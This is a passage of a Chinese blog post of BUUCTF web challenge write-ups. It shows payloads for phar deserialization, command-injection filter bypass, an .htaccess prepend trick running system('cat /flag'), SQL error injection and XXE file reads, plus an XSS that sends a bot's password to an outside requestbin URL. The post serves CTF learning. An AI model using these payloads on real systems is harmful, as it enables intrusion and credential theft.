src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719214748226.png" alt="image-20220719214748226"></p><h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>开局一个长得像sql注入的登陆页面，实际上是弱密码。。。admin/password</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719220511699.png" alt="image-20220719220511699"></p><p>上传个文件直接重命名成txt了。。。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719220406784.png" alt="image-20220719220406784"></p><p>然后这里的file参数，试着用伪协议读源码</p><p>upload.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719221052065.png" alt="image-20220719221052065"></p><pre class="language-php" data-language="php"><code class="language-php">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;上传文件&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;?phperror_reporting(0);class Uploader&#123;public $Filename;public $cmd;public $token;function __construct()&#123;$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;$ext &#x3D; &quot;.txt&quot;;@mkdir($sandbox, 0777, true);if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];&#125;else&#123;$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;&#125;$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];&#125;function upload($file)&#123;global $sandbox;global $ext;if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;&#125;else&#123;if($file[&#39;size&#39;] &gt; 1024)&#123;$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;;&#125;else&#123;$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;&#125;&#125;&#125;function __toString()&#123;global $sandbox;global $ext;&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;return $this-&gt;Filename;&#125;function __destruct()&#123;if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;&#125;eval($this-&gt;cmd);&#125;&#125;if(isset($_FILES[&#39;file&#39;])) &#123;$uploader &#x3D; new Uploader();$uploader-&gt;upload($_FILES[&quot;file&quot;]);if(@file_get_contents($uploader))&#123;echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;echo file_get_contents($uploader);&#125;&#125;?&gt;</code></pre><p>home.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();echo &quot;&lt;meta http-equiv&#x3D;\&quot;Content-Type\&quot; content&#x3D;\&quot;text&#x2F;html; charset&#x3D;utf-8\&quot; &#x2F;&gt; &lt;title&gt;Home&lt;&#x2F;title&gt;&quot;;error_reporting(0);if(isset($_SESSION[&#39;user&#39;]))&#123;if(isset($_GET[&#39;file&#39;]))&#123;if(preg_match(&quot;&#x2F;.?f.?l.?a.?g.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;die(&quot;hacker!&quot;);&#125;else&#123;if(preg_match(&quot;&#x2F;home$&#x2F;i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;&#x2F;upload$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;$file &#x3D; $_GET[&#39;file&#39;].&quot;.php&quot;;&#125;else&#123;$file &#x3D; $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;&#125;echo &quot;当前引用的是 &quot;.$file;require $file;&#125;&#125;else&#123;die(&quot;no permission!&quot;);&#125;&#125;?&gt;</code></pre><p>主要还是在upload里</p><p>看见这俩函数就直接猜是反序列化了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719221735567.png" alt="image-20220719221735567"></p><p>但是没用反序列化函数，所以应该是phar的反序列化</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719221819320.png" alt="image-20220719221819320"></p><p>file_get_contents刚好能触发</p><p><code>file_get_contents()</code> 使 <code>$uploader</code> 通过<code>__toString()</code> 返回 <code>$this-&gt;Filename</code>，<code>$this-&gt;Filename</code> 可控，因此此处 <code>$this-&gt;Filename</code> 用来触发 phar，<code>__destruct()</code> 方法内 <code>eval($this-&gt;cmd);</code> 进行 RCE</p><pre class="language-php" data-language="php"><code class="language-php">function __destruct()&#123;    if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;        $this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;    &#125;    eval($this-&gt;cmd);&#125;</code></pre><p>只要<code>$this-&gt;token</code> 和 <code>$_SESSION[&#39;user&#39;]</code> 相等，我们就能执行自己的命令</p><p> <code>$_SESSION[&#39;user&#39;]</code>我们在不加name参数的时候上传文件就会作为文件名的一部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235107502.png" alt="image-20220719235107502"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235345024.png" alt="image-20220719235345024"></p><p>GXYc20516553292cd91851e49f51dda07ef</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235817304.png" alt="image-20220719235817304"></p><p>把得到的路径作为name的值然后随便上传个文件就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235951088.png" alt="image-20220719235951088"></p><p>再来看看非预期解</p><p><strong>一</strong></p><p>因为name参数的值就是文件名，也没过滤php，所以直接让name=1.php传马就得了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220720000525217.png" alt="image-20220720000525217"></p><p><strong>二</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220720000611322.png" alt="image-20220720000611322"></p><p>上传后会显示出 <code>$uploader</code> 这个文件的内容，所以只要使 <code>$this-&gt;Filename</code> 为 <code>flag.php</code> 然后随便传个东西就会得到 flag 了。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220720001429927.png" alt="image-20220720001429927"></p><p>（别传带内容的文件，会被覆盖，要用空文件</p><h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);$comm1 &#x3D; $_GET[&#39;comm1&#39;];$comm2 &#x3D; $_GET[&#39;comm2&#39;];if(preg_match(&quot;&#x2F;\&#39;|\&#96;|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w&#x2F;is&quot;, $comm1))    $comm1 &#x3D; &quot;&quot;;if(preg_match(&quot;&#x2F;\&#39;|\&quot;|;|,|\&#96;|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w&#x2F;is&quot;, $comm2))    $comm2 &#x3D; &quot;&quot;;$flag &#x3D; &quot;#flag in &#x2F;flag&quot;;$comm1 &#x3D; &#39;&quot;&#39; . $comm1 . &#39;&quot;&#39;;$comm2 &#x3D; &#39;&quot;&#39; . $comm2 . &#39;&quot;&#39;;$cmd &#x3D; &quot;file $comm1 $comm2&quot;;system($cmd);?&gt;</code></pre><p>payload</p><pre class="language-none"><code class="language-none">?comm1&#x3D;&quot;;tac &#x2F;fla?;&quot;&amp;comm2&#x3D;1</code></pre><p>利用管道符符分割命令，同时在命令前后加双引号进行闭合操作，再用通配符绕过对flag的过滤</p><h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $files &#x3D; scandir(&#39;.&#x2F;&#39;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) &#123;        highlight_file(__FILE__);        die();    &#125;    $content &#x3D; $_GET[&#39;content&#39;];    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $filename &#x3D; $_GET[&#39;filename&#39;];    if(preg_match(&quot;&#x2F;[^a-z\.]&#x2F;&quot;, $filename) &#x3D;&#x3D; 1) &#123;        echo &quot;Hacker&quot;;        die();    &#125;    $files &#x3D; scandir(&#39;.&#x2F;&#39;);     foreach($files as $file) &#123;        if(is_file($file))&#123;            if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;                unlink($file);            &#125;        &#125;    &#125;    file_put_contents($filename, $content . &quot;\nHello, world&quot;);?&gt;</code></pre><p>有file_put_contents，可以试着写php文件进去</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220824204634727.png" alt="image-20220824204634727"></p><p>发现没有被解析，可能是设置只允许解析index.php</p><p>这时候可以尝试使用.htaccess</p><p><strong>.htaccess 中有 # 单行注释符, 且支持 \拼接上下两行。(注意后面这个东西很重要)</strong></p><p>[<a href="https://y4tacker.blog.csdn.net/article/details/116666720?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-116666720-blog-111307475.pc_relevant_multi_platform_featuressortv2dupreplace&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-116666720-blog-111307475.pc_relevant_multi_platform_featuressortv2dupreplace&utm_relevant_index=4">CTF].htaccess的使用技巧总结_Y4tacker的博客-CSDN博客_.htaccess ctf</a></p><p>可以看一下y4师傅写的这个.htaccess的文章</p><p>这个就是我们这道题的关键，因为unlink的限制，我们只被允许写入一个文件，所以只能尝试用.htaccess把自己包含掉</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220824213753335.png" alt="image-20220824213753335"></p><pre class="language-none"><code class="language-none">filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil\%0Ae%20.htaccess%0A%23%3C?php%20system(%27cat%20&#x2F;fla%27.%27g%27);?%3E\?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_append_fil\%0Ae%20.htaccess%0A%23&lt;?php system(&quot;cat &#x2F;f*&quot;);?&gt;\e两个不太一样的payload，区别在于auto_append_file和auto_prepend_file</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220824220105320.png" alt="image-20220824220105320"></p><h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>login.js</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>cookie <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> cookies <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cookies<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> arr <span class="token operator">=</span> cookies<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> key <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        cookie<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>也就是把用户名和密码都写进了表单里</p><p>注册个账户然后登录，可以看到有个类似留言框的东西</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825114219285.png" alt="image-20220825114219285"></p><p>源码里还有一些过滤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825114348683.png" alt="image-20220825114348683"></p><p>这里可以用双写绕过，然后这里是可以执行js脚本的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825114150963.png" alt="image-20220825114150963"></p><p>所以这题实际上就类似于一个xss</p><p>login.js中的记住密码功能会将读取cookie中的password。于是我们可以构造一个登录框并且引入login.js提交反馈等待bot点开获得flag</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">></span><span class="token operator">&lt;</span>incookieput type<span class="token operator">=</span><span class="token string">"password"</span> name<span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">></span><span class="token operator">&lt;</span>scrcookieipt scookierc<span class="token operator">=</span><span class="token string">"./js/login.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span><span class="token operator">&lt;</span>scrcookieipt<span class="token operator">></span>    <span class="token keyword">var</span> pwd <span class="token operator">=</span> docucookiement<span class="token punctuation">.</span><span class="token function">getcookieElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    docucookiement<span class="token punctuation">.</span>locacookietion<span class="token operator">=</span><span class="token string">"http://http.requestbin.buuoj.cn/xxx/?a="</span><span class="token operator">+</span>pwd<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>scrcookieipt<span class="token operator">></span></code></pre><p><strong>只要我们写留言，就按前端代码的格式写，用户查看留言的时候留言的代码会嵌入到前端代码里执行。</strong></p><p><strong>留言的内容大概是两个&lt;input&gt;标签，分别是username和password，然后&lt;script src=./js/login.js&gt;&lt;/script&gt;</strong></p><p><strong>因为管理员查看的时候肯定是有cookie的，就会填充到两个input，然后用javasript的代码获取&lt;input&gt;的value，再用javascript代码</strong></p><pre class="language-none"><code class="language-none">document.location&#x3D;&#96;&#96;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;xxxxxx&#x2F;?a&#x3D;&quot;&#96;&#96;+pwd;</code></pre><p> 发送到平台上（http.requestbin.buuoj.cn可以看向它请求的http包）</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825115220166.png" alt="image-20220825115220166"></p><h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>已经告诉过滤了那些了</p><p>先用order by试一下列数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825115659726.png" alt="image-20220825115659726"></p><p>可以测出有两列，那一列是uniqueid，另一列可能就是flag</p><p>两种方式，一种是用万能密码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825120840923.png" alt="image-20220825120840923"></p><p>另一种就是报错注入拿到密码</p><pre class="language-none"><code class="language-none">1 and updatexml(1,concat(0x7e,(select group_concat(uniqueid) from users),0x7e),1)</code></pre><p>837461526918364526</p><p>做完之后看一下源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825121558457.png" alt="image-20220825121558457"></p><p>可以看到有个mysqli_num_rows函数来判断返回的行数，若为1才会进入if里面的内容，而在数据库里插入了两条数据<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220825121702801.png" alt="image-20220825121702801"></p><p>所以这里万能密码后边必须加上limit 0,1才能成功</p><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><p>上传session文件伪造session。</p><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>thinkphp框架上传文件数组绕过 <strong>php</strong> 后缀限制。</p><h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p>通过调用本地dtd使XML报错读取敏感信息</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">message</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">m</span> <span class="token attr-name">"135601360123502401401250"</span><span class="token punctuation">></span></span>&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">&lt;!ENTITY % ISOamsa '&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> flag SYSTEM "file:///flag">&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> getflag "&lt;!ENTITY <span class="token entity" title="&#38;">&amp;#38;</span>#37; test SYSTEM <span class="token entity" title="&#39;">&amp;#39;</span>file:///<span class="token entity" title="&#37;">&amp;#37;</span>flag;<span class="token entity" title="&#39;">&amp;#39;</span>>">'>%local_dtd;%getflag;%test;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&m;">&amp;m;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span></code></pre><h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p>xpath注入</p><h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>ssti注入</p><h2 id="WMCTF2020-Make-PHP-Great-Again-2-0"><a href="#WMCTF2020-Make-PHP-Great-Again-2-0" class="headerlink" title="[WMCTF2020]Make PHP Great Again 2.0"></a>[WMCTF2020]Make PHP Great Again 2.0</h2><p>绕过require_once</p><h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>flask session伪造</p><h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><p>.htaccess的使用</p><h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p>ssti注入</p><h2 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2><p>双写任意文件读取</p><h2 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h2><p>利用数学函数和异或构造get语句，执行命令</p><h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>jwt伪造</p><h2 id="羊城杯-2020-Easyphp2"><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h2><p>用管道符和引号闭合命令，实现命令执行，然后su切换用户，或者在环境变量里得到flag</p><pre class="language-none"><code class="language-none">1&#39;|echo &#96;env&#96;||&#39;</code></pre><h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p>一个套到不能再套的http报文修改了</p><h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>python反序列化</p><h2 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h2><p>php反序列化</p><h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2><p>java的xxe</p><p>（没做出来，很怪，照抄的payload连dnslog都没有，更别提外带了</p><h2 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2><p>thinkphp的代码审计</p><h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>pug文件的命令执行和nodejs8.0版本导致的切分攻击造成的请求走私</p><h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2><p>Laravel的代码审计，审个反序列化链子出来</p><h2 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2><p>用报错的方式得到secret_key，然后实现伪造session</p><h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><p>perl的文件上传，利用了param()函数和&lt;$file&gt;，两个尖括号这种读文件的方式</p><p>（很怪，这种源码是怎么猜出来的</p><blockquote><p>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。</p></blockquote><h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><p>伪造php session</p><h2 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h2><p><strong>FFI</strong>：<strong>实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions</strong></p><p>是 <strong>PHP7.4</strong> 中新加入的功能</p><p>opcache.preload：/var/www/html/preload.php</p><p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload">opcache.preload</a> 是 <strong>PHP7.4</strong> 中新加入的功能。如果设置了 <a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload">opcache.preload</a> ，那么在所有Web应用程序运行之前，服务会先将设定的 <strong>preload</strong> 文件加载进内存中，使这些 <strong>preload</strong> 